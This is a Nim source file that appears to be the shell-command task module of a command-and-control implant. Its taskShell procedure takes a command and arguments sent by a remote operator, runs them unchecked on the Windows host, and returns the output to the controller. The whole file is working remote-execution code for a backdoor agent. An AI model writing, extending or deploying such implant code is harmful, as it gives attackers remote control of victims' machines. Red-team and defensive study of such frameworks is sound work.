import winim, osproc, strutils, strformat

import ../core/taskresult
import ../agentTypes
import ../../../common/[types, utils]

proc taskShell*(config: AgentConfig, task: Task): TaskResult = 

    try: 
        var 
            command: string 
            arguments: string

        # Parse arguments 
        case int(task.argCount): 
        of 1: # Only the command has been passed as an argument
            command = task.args[0].data.toString()
            arguments = ""
        of 2: # The optional 'arguments' parameter was included
            command = task.args[0].data.toString()
            arguments = task.args[1].data.toString()
        else:  
            discard 

        echo fmt"   [>] Executing: {command} {arguments}."

        let (output, status) = execCmdEx(fmt("{command} {arguments}")) 

        if output != "":
            return createTaskResult(task, cast[StatusType](status), RESULT_STRING, output.toBytes())
        else: 
            return createTaskResult(task, cast[StatusType](status), RESULT_NO_OUTPUT, @[])

    except CatchableError as err: 
        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
